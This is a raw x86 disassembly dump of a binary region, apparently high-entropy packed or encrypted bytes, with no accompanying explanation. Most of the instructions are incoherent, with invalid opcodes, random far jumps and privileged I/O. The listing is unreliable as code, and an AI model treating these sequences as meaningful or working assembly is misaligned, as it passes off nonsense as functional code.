  417a24:	adc    DWORD PTR [edx+0x4c],ebx
  417a27:	inc    esi
  417a28:	loopne 0x417a57
  417a2a:	add    eax,0xcce42447
  417a2f:	mov    ah,0xc3
  417a31:	push   cs
  417a32:	adc    eax,0xf83aed2d
  417a37:	cmp    dl,bh
  417a39:	jmp    0x417a3a
  417a3b:	jnp    0x4179c6
  417a3d:	add    eax,0x39bcb181
  417a42:	scas   eax,DWORD PTR es:[edi]
  417a43:	dec    edi
  417a44:	les    esp,FWORD PTR [ecx]
  417a46:	dec    eax
  417a47:	fcmovnbe st,st(6)
  417a49:	hlt    
  417a4a:	xchg   ecx,eax
  417a4b:	jbe    0x417a09
  417a4d:	sbb    edx,DWORD PTR [ebp-0x48270d04]
  417a53:	jno    0x417a6b
  417a55:	nop
  417a56:	cwde   
  417a57:	aas    
  417a58:	(bad)  
  417a59:	push   ebp
  417a5a:	icebp  
  417a5b:	push   cs
  417a5c:	mov    esi,0x9bd2b1ff
  417a61:	lods   al,BYTE PTR ds:[esi]
  417a62:	test   eax,0xcecc36f
  417a67:	mov    WORD PTR [edi+0x4e],cs
  417a6a:	pop    ecx
  417a6b:	cmp    DWORD PTR [esi+0x44f33d16],ebx
  417a71:	jmp    0xb671:0x6caf444f
  417a78:	jb     0x417aab
  417a7a:	pop    esi
  417a7b:	les    ebx,FWORD PTR [eax-0x4aa1f73a]
  417a81:	jns    0x417ad7
  417a83:	cs stos DWORD PTR es:[edi],eax
  417a85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a86:	xor    DWORD PTR [edi],ecx
  417a88:	int3   
  417a89:	sar    BYTE PTR [esi],cl
  417a8b:	ds pop ss
  417a8d:	aad    0x1f
  417a8f:	xor    al,0xa4
  417a91:	xchg   ebp,eax
  417a92:	(bad)  
  417a93:	call   0x28b274a8
  417a98:	pop    esi
  417a99:	xor    eax,DWORD PTR [ecx+0x8]
  417a9c:	xchg   esp,eax
  417a9d:	dec    ebp
  417a9e:	mov    BYTE PTR [esi-0x3d6a956f],dl
  417aa4:	xchg   ebp,eax
  417aa5:	adc    eax,0x69564099
  417aaa:	mov    dl,0x8f
  417aac:	arpl   WORD PTR [edx],bx
  417aae:	push   ebp
  417aaf:	jge    0x417a67
  417ab1:	push   cs
  417ab2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ab3:	jecxz  0x417afa
  417ab5:	addr16 jg 0x417ac9
  417ab8:	out    dx,al
  417ab9:	and    eax,0x884527ec
  417abe:	mov    BYTE PTR [esi],bl
  417ac0:	mov    DWORD PTR [edx+ebp*8-0x2df6652c],ebx
  417ac7:	sti    
  417ac8:	into   
  417ac9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417aca:	dec    ecx
  417acb:	cmc    
  417acc:	test   al,0xa9
  417ace:	repz xchg esi,eax
  417ad0:	sub    ecx,ebx
  417ad2:	int    0x80
  417ad4:	sahf   
  417ad5:	pop    es
  417ad6:	inc    esp
  417ad7:	shl    cl,1
  417ad9:	sub    al,0x5e
  417adb:	xchg   ebx,eax
  417adc:	retf   
  417add:	push   esi
  417ade:	push   edi
  417adf:	jge    0x417a6e
  417ae1:	or     ebx,DWORD PTR [ecx-0x53]
  417ae4:	in     eax,dx
  417ae5:	inc    esp
  417ae6:	inc    esp
  417ae7:	mov    al,0xb3
  417ae9:	ror    DWORD PTR [ecx],1
  417aeb:	shr    DWORD PTR [edi],0x3d
  417aee:	icebp  
  417aef:	dec    ebx
  417af0:	or     DWORD PTR [ebp+edi*2+0x16],esp
  417af4:	clc    
  417af5:	adc    BYTE PTR [eax],cl
  417af7:	(bad)  
  417af8:	mov    eax,0x74a68eae
  417afd:	sti    
  417afe:	fidiv  WORD PTR [eax]
  417b00:	call   0x854:0xc9e0d444
  417b07:	sahf   
  417b08:	test   al,ch
  417b0a:	push   edx
  417b0b:	fcomp  QWORD PTR [ebp-0x4c38dd14]
  417b11:	call   0x2508:0x7070edfb
  417b18:	mov    es,WORD PTR [ebx+0x5961b53d]
  417b1e:	pop    ebp
  417b1f:	or     DWORD PTR [edx],esp
  417b21:	fsub   QWORD PTR [edx+0x29f743cb]
  417b27:	add    BYTE PTR [edi-0x3f],0x28
  417b2b:	pop    ebp
  417b2c:	sbb    bh,cl
  417b2e:	fnstsw WORD PTR [ecx+eax*4]
  417b31:	pop    edi
  417b32:	sbb    al,0x59
  417b34:	and    eax,0xe173253d
  417b39:	cmp    BYTE PTR [eax-0x29],al
  417b3c:	inc    esp
  417b3d:	xor    esp,DWORD PTR [ebx-0x6b]
  417b40:	repnz int 0xc7
  417b43:	and    ecx,esp
  417b45:	or     al,BYTE PTR [ecx+0x3ecaa0d6]
  417b4b:	cmp    DWORD PTR [edx-0x7],ecx
  417b4e:	ja     0x417ad5
  417b50:	sbb    al,0xc6
  417b52:	fcomp  QWORD PTR [eax]
  417b54:	fcomip st,st(2)
  417b56:	(bad)  
  417b57:	retf   
  417b58:	sbb    DWORD PTR [esi-0x2d],0xffffffdf
  417b5c:	xor    dh,BYTE PTR [edx]
  417b5e:	in     eax,dx
  417b5f:	xchg   DWORD PTR [eax],eax
  417b61:	call   0x8ed5:0xfab45fa
  417b68:	jg     0x417b56
  417b6a:	ja     0x417b37
  417b6c:	outs   dx,DWORD PTR ds:[esi]
  417b6d:	xchg   ecx,eax
  417b6e:	mov    dh,0x38
  417b70:	loope  0x417b0b
  417b72:	or     eax,0x529f4bd1
  417b77:	cmp    al,0x90
  417b79:	scas   eax,DWORD PTR es:[edi]
  417b7a:	ja     0x417b44
  417b7c:	aam    0x8a
  417b7e:	retf   0x7da8
  417b81:	jp     0x417bef
  417b83:	push   es
  417b84:	dec    eax
  417b85:	xor    ebp,DWORD PTR [edx-0x564eb5c]
  417b8b:	outs   dx,BYTE PTR ds:[esi]
  417b8c:	cs jne 0x417b38
  417b8f:	mov    ds:0x833bc45d,eax
  417b94:	icebp  
  417b95:	loopne 0x417b2a
  417b97:	fiadd  WORD PTR [edi+esi*8]
  417b9a:	jno    0x417b83
  417b9c:	xor    eax,0x1457dbb5
  417ba1:	fs cs fmulp st(6),st
  417ba5:	inc    ebx
  417ba6:	popf   
  417ba7:	adc    BYTE PTR [esi+0x2b54c677],ah
  417bad:	lahf   
  417bae:	enter  0x82eb,0xd4
  417bb2:	and    ch,bl
  417bb4:	gs xchg edi,eax
  417bb6:	dec    esp
  417bb7:	lods   eax,DWORD PTR ds:[esi]
  417bb8:	cdq    
  417bb9:	xchg   edx,eax
  417bba:	ss xchg esi,eax
  417bbc:	sbb    bl,bl
  417bbe:	fidiv  WORD PTR [esi+0x31]
  417bc1:	mov    cl,BYTE PTR [eax-0xb]
  417bc4:	je     0x417ba7
  417bc6:	daa    
  417bc7:	jbe    0x417c27
  417bc9:	or     ch,BYTE PTR [esp+ebp*1+0x101dd37c]
  417bd0:	sbb    al,0x15
  417bd2:	test   DWORD PTR [ecx+0x24425630],ebp
  417bd8:	out    dx,eax
  417bd9:	mov    edi,0xa28a80bf
  417bde:	adc    ch,BYTE PTR [edi-0x13dbb80b]
  417be4:	mov    dl,0xbd
  417be6:	(bad)  
  417be7:	cld    
  417be8:	in     al,dx
  417be9:	inc    DWORD PTR [edx+0x7d]
  417bec:	xor    bh,0xdd
  417bef:	(bad)  
  417bf1:	stos   DWORD PTR es:[edi],eax
  417bf2:	lods   al,BYTE PTR cs:[esi]
  417bf4:	and    eax,0xaa54b6b4
  417bf9:	dec    ebx
  417bfa:	inc    edx
  417bfb:	call   0xa366185
  417c00:	push   esi
  417c01:	call   0x1380:0xb7a9b9da
  417c08:	fstp   QWORD PTR [edi+0x10]
  417c0b:	mov    ds:0x6e5ab409,al
  417c10:	jge    0x417c7e
  417c12:	lahf   
  417c13:	inc    ebx
  417c14:	push   ebp
  417c15:	jmp    0x417c15
  417c17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c18:	(bad)  
  417c19:	jge    0x417bc9
  417c1b:	mov    ds:0x16adb543,eax
  417c20:	mov    al,ds:0xfb397e54
  417c25:	lds    ebp,FWORD PTR [edx-0x2e202188]
  417c2b:	stos   BYTE PTR es:[edi],al
  417c2c:	mov    esp,gs
  417c2e:	cwde   
  417c2f:	dec    edi
  417c30:	inc    edx
  417c31:	sub    eax,0xe482ffe8
  417c36:	enter  0x99aa,0x5d
  417c3a:	mov    ebp,0x49338ff0
  417c3f:	dec    ebp
  417c40:	mov    ecx,0xbfab82db
  417c45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c46:	arpl   WORD PTR [edx+0x7a],bx
  417c49:	jg     0x417c84
  417c4b:	leave  
  417c4c:	loop   0x417c1d
  417c4e:	clc    
  417c4f:	add    cl,BYTE PTR [ebx]
  417c51:	sbb    bl,BYTE PTR [ebx-0x4a6f2bb9]
  417c57:	stos   BYTE PTR es:[edi],al
  417c58:	add    al,0xc8
  417c5a:	xor    al,0x56
  417c5c:	mov    BYTE PTR [eax-0x1cb554f4],bl
  417c62:	clc    
  417c63:	or     BYTE PTR [edx],dh
  417c65:	xor    BYTE PTR [edi+0x57cc60a8],ah
  417c6b:	push   ebp
  417c6c:	popf   
  417c6d:	push   esi
  417c6e:	stc    
  417c6f:	add    BYTE PTR [edx-0x42],0xce
  417c73:	int3   
  417c74:	ds lock sub al,0x3e
  417c78:	aas    
  417c79:	in     al,0x49
  417c7b:	mov    ebx,0xaf21df14
  417c80:	pop    eax
  417c81:	fadd   QWORD PTR [ecx]
  417c83:	xchg   edx,eax
  417c84:	xor    DWORD PTR [esi],ebx
  417c86:	adc    al,0x59
  417c88:	inc    eax
  417c89:	pop    esp
  417c8a:	call   0xc295196f
  417c8f:	jno    0x417ced
  417c91:	push   ebp
  417c92:	popa   
  417c93:	retf   0xa731
  417c96:	sbb    DWORD PTR [eax+eax*1+0x0],ecx
	...
  417d12:	add    BYTE PTR [eax],al
  417d14:	mov    esp,0xf767f68f
  417d19:	jg     0x417cd8
  417d1b:	fist   WORD PTR [esi+0x1bba792d]
  417d21:	arpl   WORD PTR [edx],dx
  417d23:	into   
  417d24:	mov    ecx,0x6c00011f
  417d29:	pop    es
  417d2a:	add    BYTE PTR [eax],al
  417d2c:	fistp  DWORD PTR [ebp-0x3394112c]
  417d32:	xchg   esp,eax
  417d33:	sbb    BYTE PTR [edx],bh
  417d35:	sahf   
  417d36:	adc    ebx,DWORD PTR [edx-0x5a]
  417d39:	popa   
  417d3a:	out    0x77,al
  417d3c:	sar    esp,1
  417d3e:	popa   
  417d3f:	sahf   
  417d40:	test   DWORD PTR [ebx-0x70],0x5f246c7e
  417d47:	(bad)  
  417d49:	inc    ecx
  417d4a:	cwde   
  417d4b:	fcom   st(0)
  417d4d:	and    ah,bh
  417d4f:	sar    eax,0x4
  417d52:	push   esp
  417d53:	sti    
  417d54:	mov    ecx,0x1f63ab65
  417d59:	jecxz  0x417d88
  417d5b:	or     ah,BYTE PTR [ecx-0x7a3dab83]
  417d61:	das    
  417d62:	outs   dx,DWORD PTR ds:[esi]
  417d63:	sbb    DWORD PTR [esi],edi
  417d65:	hlt    
  417d66:	sbb    esp,DWORD PTR [eax+0x5a]
  417d69:	pop    edx
  417d6a:	test   al,0xdb
  417d6c:	fwait
  417d6d:	pop    ecx
  417d6e:	push   eax
  417d6f:	and    ebx,DWORD PTR [ecx-0x74]
  417d72:	int3   
  417d73:	out    0x24,eax
  417d75:	iret   
  417d76:	mov    bl,0xca
  417d78:	mov    esi,esi
  417d7a:	push   ds
  417d7b:	xor    eax,0x39
  417d7e:	cmc    
  417d7f:	rcl    BYTE PTR ds:0xda4bfcc7,1
  417d85:	ret    
  417d86:	jae    0x417df1
  417d88:	jecxz  0x417d90
  417d8a:	push   0x46545306
  417d8f:	adc    BYTE PTR [edi],cl
  417d91:	xchg   esi,eax
  417d92:	rcl    DWORD PTR [ebp-0x26cea924],cl
  417d98:	dec    edx
  417d99:	push   es
  417d9a:	xor    ecx,edx
  417d9c:	push   edi
  417d9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d9e:	cmp    esp,DWORD PTR [esi+0x5d]
  417da1:	(bad)  
  417da2:	cmp    DWORD PTR [edi],eax
  417da4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417da5:	mov    eax,ds:0x5cacd978
  417daa:	in     al,0x67
  417dac:	adc    al,0x91
  417dae:	cmp    DWORD PTR [ebp-0x7ea8e685],esp
  417db4:	or     BYTE PTR ds:0xb8827d1a,ch
  417dba:	lods   eax,DWORD PTR ds:[esi]
  417dbb:	mov    cl,0xfe
  417dbd:	clc    
  417dbe:	cli    
  417dbf:	sbb    DWORD PTR [ecx],eax
  417dc1:	dec    esp
  417dc2:	loope  0x417d6e
  417dc4:	mov    ds:0x6c8a2ed3,al
  417dc9:	adc    al,0x2b
  417dcb:	mov    gs,edi
  417dcd:	fucomip st,st(0)
  417dcf:	sub    eax,0xa8c43189
  417dd4:	jb     0x417e47
  417dd6:	and    al,0x9a
  417dd8:	mov    esi,0xe428ad91
  417ddd:	inc    edx
  417dde:	or     ah,dh
  417de0:	xlat   BYTE PTR ds:[ebx]
  417de1:	js     0x417d8b
  417de3:	push   edx
  417de4:	fs ins DWORD PTR es:[edi],dx
  417de6:	aad    0x34
  417de8:	and    esp,DWORD PTR [eax]
  417dea:	and    eax,0x1e38f0d8
  417def:	xchg   ecx,eax
  417df0:	push   0xf718cc56
  417df5:	mov    dh,0x6d
  417df7:	sti    
  417df8:	xor    DWORD PTR [eax+0x3a],esp
  417dfb:	mov    fs,WORD PTR [edx+0x267a6937]
  417e01:	fbstp  TBYTE PTR [ebx+ecx*4-0x42]
  417e05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e06:	das    
  417e07:	sbb    ebx,esi
  417e09:	call   0x428b0e84
  417e0e:	mov    al,0x4f
  417e10:	hlt    
  417e11:	lahf   
  417e12:	pushf  
  417e13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e14:	pop    ss
  417e15:	out    dx,al
  417e16:	xor    ch,BYTE PTR [esi+0x29]
  417e19:	jge    0x417e7c
  417e1b:	outs   dx,BYTE PTR ds:[esi]
  417e1c:	push   0x4a9f2e98
  417e21:	loopne 0x417e76
  417e23:	fwait
  417e24:	rcr    DWORD PTR [ecx+esi*8+0x2ee8df82],0x53
  417e2c:	jp     0x417e34
  417e2e:	nop
  417e2f:	mov    ds:0xedcc519a,al
  417e34:	and    eax,DWORD PTR [eax]
  417e36:	adc    eax,0x489ae1c0
  417e3b:	mov    edi,edx
  417e3d:	dec    edi
  417e3e:	and    eax,0x93b455c1
  417e43:	je     0x417e3b
  417e45:	or     DWORD PTR [ecx],esi
  417e47:	pushf  
  417e48:	dec    ebx
  417e49:	hlt    
  417e4a:	cmp    cl,bh
  417e4c:	cs jmp 0xb5dd:0x8a4d5402
  417e54:	xor    al,0xc
  417e56:	or     cl,ch
  417e58:	mov    esp,0x9504d9a9
  417e5d:	popf   
  417e5e:	popa   
  417e5f:	and    edi,DWORD PTR [edx+0x3f2ff10]
  417e65:	and    BYTE PTR [esp+eax*1-0x1d],ch
  417e69:	mov    bh,BYTE PTR [edx+0x495abd20]
  417e6f:	inc    esp
  417e70:	xchg   ecx,eax
  417e71:	(bad)  
  417e72:	xor    dh,BYTE PTR [esi]
  417e74:	in     eax,0x87
  417e76:	in     eax,dx
  417e77:	adc    esi,DWORD PTR [eax-0x8741fa3]
  417e7d:	in     al,dx
  417e7e:	fs cmp eax,0x336ac590
  417e84:	lea    edi,[edx+0x5795ef16]
  417e8a:	ret    
  417e8b:	lds    ecx,FWORD PTR [eax+0x266e5d7]
  417e91:	xor    al,0x63
  417e93:	and    al,0xa2
  417e95:	sti    
  417e96:	cs clc 
  417e98:	inc    ebp
  417e99:	push   ds
  417e9a:	and    DWORD PTR [esi],0x51a02dc
  417ea0:	neg    BYTE PTR [ecx+0x276270f6]
  417ea6:	dec    eax
  417ea7:	outs   dx,DWORD PTR ds:[esi]
  417ea8:	or     BYTE PTR [eax+0x4c9db8cb],0xe8
  417eaf:	sub    eax,0x70023fb9
  417eb4:	sub    eax,0xb9c47d0f
  417eb9:	or     DWORD PTR [ecx],ebx
  417ebb:	sbb    bh,BYTE PTR [ecx+0x37150e2c]
  417ec1:	dec    DWORD PTR [edi+ebp*4]
  417ec4:	push   ss
  417ec5:	in     eax,dx
  417ec6:	(bad)  
  417ec7:	ds jns 0x417ef2
  417eca:	test   BYTE PTR [ebx-0x7e],ah
  417ecd:	cmp    edx,ebx
  417ecf:	or     al,0xbe
  417ed1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ed2:	dec    esi
  417ed3:	sub    al,0x34
  417ed5:	and    DWORD PTR [eax],ebp
  417ed7:	ss ins DWORD PTR es:[edi],dx
  417ed9:	ins    DWORD PTR es:[edi],dx
  417eda:	adc    esp,DWORD PTR [eax]
  417edc:	mov    cl,0xb
  417ede:	std    
  417edf:	xchg   edi,eax
  417ee0:	pusha  
  417ee1:	fnstcw WORD PTR [ebp-0x5df667c7]
  417ee7:	fs sub eax,0xbab2c5ca
  417eed:	pop    ss
  417eee:	inc    cx
  417ef0:	mov    gs,ebp
  417ef2:	cmp    DWORD PTR [esi+0x31bb55a7],esi
  417ef8:	ret    
  417ef9:	jbe    0x417ed3
  417efb:	or     eax,0x3a32b241
  417f00:	hlt    
  417f01:	shl    DWORD PTR ds:0xcfb3d2ba,1
  417f07:	push   edi
  417f08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f09:	xchg   eax,edx
  417f0b:	cwde   
  417f0c:	cmp    ah,cl
  417f0e:	xchg   esi,eax
  417f0f:	adc    edi,DWORD PTR [ebx+0x4c]
  417f12:	and    cl,BYTE PTR [ecx]
  417f14:	test   DWORD PTR [edi-0x6d3e5a41],0xc9ddda1e
  417f1e:	ret    
  417f1f:	push   es
  417f20:	pop    esi
  417f21:	popa   
  417f22:	adc    al,0xa9
  417f24:	mov    al,ds:0x187f58eb
  417f29:	dec    edi
  417f2a:	inc    ebp
  417f2b:	push   edx
  417f2c:	aam    0xf4
  417f2e:	add    edi,DWORD PTR [ecx+eax*4]
  417f31:	mov    ds,WORD PTR [esi]
  417f33:	rcl    DWORD PTR [edi-0x65422d88],1
  417f39:	(bad)  
  417f3a:	dec    esi
  417f3b:	neg    BYTE PTR [ebp+0x86a55ee]
  417f41:	cmp    edx,esi
  417f43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f44:	popf   
  417f45:	mov    BYTE PTR [ebp+0x3a],dl
  417f48:	dec    edi
  417f49:	popa   
  417f4a:	cld    
  417f4b:	loopne 0x417fc6
  417f4d:	clc    
  417f4e:	and    DWORD PTR [esi+0x5c],esi
  417f51:	mov    ds:0x9b7f5577,eax
  417f56:	cmp    BYTE PTR [edx],ah
  417f58:	mov    bl,0x70
  417f5a:	lods   eax,DWORD PTR ss:[esi]
  417f5c:	inc    edx
  417f5d:	sbb    BYTE PTR fs:[ebx-0x4e],bh
  417f61:	outs   dx,DWORD PTR ds:[esi]
  417f62:	mov    al,0x59
  417f64:	rol    DWORD PTR [ebp-0xa],0x5d
  417f68:	std    
  417f69:	xor    dh,BYTE PTR ds:[esi]
  417f6c:	out    dx,eax
  417f6d:	jae    0x417f9c
  417f6f:	repnz lahf 
  417f71:	mov    al,0xa2
  417f73:	(bad)  
  417f74:	out    0x2c,eax
  417f76:	sub    ch,BYTE PTR [ebx]
  417f78:	stc    
  417f79:	adc    dh,BYTE PTR [ecx]
  417f7b:	jle    0x417fca
  417f7d:	sbb    DWORD PTR [edx-0x36],0xd075bb0c
  417f84:	sbb    eax,0x969e2b74
  417f89:	mov    edi,0x2d749ce0
  417f8e:	fstp   DWORD PTR [eax-0x4865cd2b]
  417f94:	iret   
  417f95:	(bad)  [ebx+0x6527f35]
  417f9b:	loope  0x417f8e
  417f9d:	or     eax,0x5fb1687f
  417fa2:	arpl   WORD PTR ds:0xbddf6875,bp
  417fa8:	xchg   edi,eax
  417fa9:	shr    BYTE PTR [edx+ecx*4-0x3ba30e88],cl
  417fb0:	add    ah,BYTE PTR [ecx+0x439ea93f]
  417fb6:	enter  0x4936,0xad
  417fba:	nop
  417fbb:	sbb    BYTE PTR [ebx+ebx*8],0xea
  417fbf:	pop    ecx
  417fc0:	(bad)  
  417fc1:	repnz mov dh,0xb
  417fc4:	jne    0x417f4f
  417fc6:	scas   al,BYTE PTR es:[edi]
  417fc7:	mov    BYTE PTR [edi-0x6e],al
  417fca:	and    cl,BYTE PTR [ebx]
  417fcc:	pop    ecx
  417fcd:	cmc    
  417fce:	(bad)  
  417fcf:	fwait
  417fd0:	or     DWORD PTR [eax+0x6d4aecec],eax
  417fd6:	fild   DWORD PTR [ebx+0x72]
  417fd9:	sbb    dh,ch
  417fdb:	scas   eax,DWORD PTR es:[edi]
  417fdc:	in     eax,0x83
  417fde:	dec    esp
  417fdf:	addr16 pop eax
  417fe1:	and    al,0x36
  417fe3:	add    eax,0xf57e0a9d
  417fe8:	fs out 0xdf,al
  417feb:	xchg   edi,eax
  417fec:	add    BYTE PTR [ebp-0xf],0x12
  417ff0:	(bad)  
  417ff2:	test   eax,0xcc0360d4
  417ff7:	scas   eax,DWORD PTR es:[edi]
  417ff8:	cli    
  417ff9:	mov    al,ds:0xd00990f9
  417ffe:	retf   
  417fff:	popa   
  418000:	pop    eax
  418001:	bound  ebx,QWORD PTR [ebp-0x1b]
  418004:	leave  
  418005:	das    
  418006:	faddp  st(7),st
  418008:	jmp    0x41804a
  41800a:	mov    esi,0x80282ccf
  41800f:	mov    ecx,?
  418011:	jmp    0x3b2d0c63
  418016:	ja     0x418062
  418018:	hlt    
  418019:	cmp    DWORD PTR [edi-0x4ee7996e],eax
  41801f:	in     eax,0xb9
  418021:	sub    eax,0x97de72bd
  418026:	xchg   ebp,eax
  418027:	sub    al,0x39
  418029:	or     BYTE PTR [ecx+0x2695790f],al
  41802f:	repnz fxch st(6)
  418032:	mov    ebx,0x82d6bb9c
  418037:	jo     0x417fc9
  418039:	leave  
  41803a:	neg    al
  41803c:	mov    bl,0x1a
  41803e:	push   ss
  41803f:	inc    ebx
  418040:	adc    al,0x2f
  418042:	ficom  WORD PTR ds:[edi+0x4ae71787]
  418049:	mov    ecx,0x2280e5e3
  41804e:	(bad)  
  418050:	mov    ecx,0x65d6d2e4
  418055:	jge    0x4180cb
  418057:	mov    eax,ds:0x938209d9
  41805c:	or     al,0x2b
  41805e:	fild   DWORD PTR [ebx]
  418060:	xchg   BYTE PTR [edi-0x7fa1049a],al
  418066:	nop
  418067:	(bad)  
  418068:	jp     0x41804c
  41806a:	mov    eax,0xd6146308
  41806f:	mov    BYTE PTR [ecx+0x1],0x43
  418073:	push   esi
  418074:	(bad)
  418079:	mov    dh,0x87
  41807b:	call   0xce01fe2f
  418080:	push   ebp
  418081:	dec    esp
  418082:	push   ebx
  418083:	ss icebp 
  418085:	adc    edx,edi
  418087:	jecxz  0x418090
  418089:	imul   ebp,ebx,0x5c2d5fa5
  41808f:	and    ecx,DWORD PTR [eax+ecx*4]
  418092:	xor    ebp,ecx
  418094:	xchg   DWORD PTR [ebp+eiz*4+0x3b],esp
  418098:	add    al,0x2e
  41809a:	sub    bh,BYTE PTR [edi-0x6c]
  41809d:	test   al,0x1b
  41809f:	cli    
  4180a0:	push   esp
  4180a1:	jae    0x418073
  4180a3:	add    edi,DWORD PTR ds:0x273854b2
  4180a9:	out    dx,eax
  4180aa:	and    al,0x8c
  4180ac:	push   es
  4180ad:	repz inc esp
  4180af:	(bad)  [esi-0x24]
  4180b2:	pop    ecx
  4180b3:	and    eax,0xd181391b
  4180b8:	addr16 test eax,0xe043e0fb
  4180be:	pusha  
  4180bf:	mov    gs,WORD PTR [edi+0x7e00dfd8]
  4180c5:	shr    esp,0x65
  4180c8:	fisttp DWORD PTR [eax]
  4180ca:	pop    esi
  4180cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4180cc:	xchg   dx,ax
  4180ce:	jg     0x418090
  4180d0:	jle    0x418150
  4180d2:	cdq    
  4180d3:	pusha  
  4180d4:	ja     0x4180d7
  4180d6:	les    eax,FWORD PTR [ecx+0x2ee6ffe2]
  4180dc:	imul   edx,DWORD PTR [esi],0xffffffe1
  4180df:	shl    DWORD PTR [esi],0x89
  4180e2:	mov    ss,eax
  4180e4:	cmp    al,0x66
  4180e6:	(bad)  
  4180e7:	leave  
  4180e8:	dec    esi
  4180e9:	(bad)  
  4180ea:	(bad)  [esi]
  4180ec:	mov    ebx,DWORD PTR [eax+0x8ed3939]
  4180f2:	mov    ss,edx
  4180f4:	or     ebx,DWORD PTR [ebx+0x6c3d70d6]
  4180fa:	in     eax,0x31
  4180fc:	mov    esi,DWORD PTR [esi-0x4e]
  4180ff:	(bad)  
  418101:	mov    edx,0x7ad5b55a
  418106:	sbb    bl,BYTE PTR [ebp+edx*4-0x60c775d4]
  41810d:	das    
  41810e:	inc    esi
  41810f:	dec    ebx
  418111:	jle    0x4180d3
  418113:	aam    0x94
  418115:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418116:	jbe    0x41815a
  418118:	in     eax,0x50
  41811a:	cmp    DWORD PTR [edx],0x52
  41811d:	es mov bh,0xb4
  418120:	push   eax
  418121:	cli    
  418122:	jne    0x4180d5
  418124:	jne    0x418199
  418126:	xchg   edx,eax
  418127:	xor    eax,0x64563ae9
  41812c:	sti    
  41812d:	nop
  41812e:	mov    ebx,0xa7f91fcd
  418133:	(bad)  
  418134:	dec    esi
  418135:	push   esp
  418136:	(bad)  
  418137:	ret    
  418138:	mov    esp,0xa2a6689d
  41813d:	inc    eax
  41813e:	mov    cl,0x68
  418140:	mov    cl,0xc0
  418142:	sbb    edx,DWORD PTR [ebp-0x4e]
  418145:	cmp    ch,cl
  418147:	pop    edi
  418148:	(bad)  
  418149:	test   al,0x65
  41814b:	cmp    al,0x21
  41814d:	test   DWORD PTR [edi],esi
  41814f:	out    dx,al
  418150:	xor    BYTE PTR [ecx-0x18],cl
  418153:	jae    0x4180e3
  418155:	push   cs
  418156:	pushf  
  418157:	mov    esi,0x3229c4ee
  41815c:	shl    dh,1
  41815e:	enter  0x5f67,0x5d
  418162:	stos   DWORD PTR es:[edi],eax
  418163:	dec    ebp
  418164:	or     BYTE PTR [ecx+0x2c],bl
  418167:	jmp    0x4f01:0x5c510024
  41816e:	popa   
  41816f:	mov    ebx,0xe24f54fc
  418174:	push   ebx
  418175:	(bad)  
  418176:	std    
  418177:	pop    ecx
  418178:	popf   
  418179:	push   esp
  41817a:	and    bl,0x1d
  41817d:	mov    bl,0x50
  41817f:	sub    DWORD PTR [esi-0x36],0xd74110ee
  418186:	adc    DWORD PTR [ebx+0x7d],0x72ac1780
  41818d:	stos   DWORD PTR es:[edi],eax
  41818e:	sub    DWORD PTR [edx+0x47188433],0x51f89e35
  418198:	push   es
  418199:	ds xchg edi,eax
  41819b:	mov    cl,bl
  41819d:	pop    edi
  41819e:	repnz add DWORD PTR [edx+0x45],edx
  4181a2:	or     dl,al
  4181a4:	jae    0x4181e0
  4181a6:	aaa    
  4181a7:	repz pop eax
  4181a9:	inc    esi
  4181aa:	cli    
  4181ab:	xchg   esi,eax
  4181ac:	inc    edi
  4181ad:	mov    fs,eax
  4181af:	lds    esp,FWORD PTR [eax]
  4181b1:	fstp   DWORD PTR [ecx+esi*8-0x60d22679]
  4181b8:	jg     0x418228
  4181ba:	and    cl,0x1b
  4181bd:	stc    
  4181be:	out    dx,eax
  4181bf:	fiadd  WORD PTR [edx+ebp*1+0x29d68872]
  4181c6:	add    ebp,DWORD PTR [eax-0x2c]
  4181c9:	or     BYTE PTR [ecx],dl
  4181cb:	inc    esp
  4181cc:	jmp    0x4181cb
  4181ce:	and    ah,ch
  4181d0:	jecxz  0x4181a3
  4181d2:	(bad)  
  4181d3:	fstp   QWORD PTR [eax+0x45d0c98]
  4181d9:	mov    DWORD PTR [edi+0x21],ebp
  4181dc:	pop    esp
  4181dd:	cmp    ecx,DWORD PTR [ecx]
  4181df:	nop
  4181e0:	aaa    
  4181e1:	jp     0x4181d2
  4181e3:	jmp    esp
  4181e5:	or     esi,esi
  4181e7:	dec    ebp
  4181e8:	push   ebp
  4181e9:	xchg   esp,ebp
  4181eb:	mov    ds:0x1406a252,al
  4181f0:	(bad)  
  4181f1:	in     al,0x39
  4181f3:	push   esp
  4181f4:	xchg   edx,edx
  4181f6:	and    al,0xb5
  4181f8:	inc    esi
  4181f9:	out    dx,al
  4181fa:	cmp    DWORD PTR [esi-0x2],ebp
  4181fd:	xchg   ebx,eax
  4181fe:	pop    ebp
  4181ff:	stc    
  418200:	and    ch,BYTE PTR [ecx-0x3d]
  418203:	test   eax,0x1ac7a6e1
  418208:	cmp    al,0x4a
  41820a:	mov    ecx,0xd449c86d
  41820f:	xor    eax,0xae1df48
  418214:	jle    0x4181dc
  418216:	or     eax,0x1e71c1e5
  41821b:	cmc    
  41821c:	loop   0x418269
  41821e:	cmc    
  41821f:	and    eax,0x669f94cc
  418224:	mov    dh,0xec
  418226:	(bad)
  418229:	loopne 0x418283
  41822b:	out    0xa4,al
  41822d:	xchg   esi,eax
  41822e:	adc    eax,0x626cf139
  418233:	xchg   DWORD PTR [edx+0x5cbce58e],edi
  418239:	or     DWORD PTR ds:0x105672dc,esp
  41823f:	xchg   edx,eax
  418240:	pop    ebp
  418241:	inc    edi
  418242:	add    BYTE PTR [ecx+0x2e],cl
  418245:	(bad)  
  418246:	and    DWORD PTR [edx+0x36623864],ebp
  41824c:	cmp    BYTE PTR [ecx-0x60],al
  41824f:	add    al,0x9d
  418251:	pop    ss
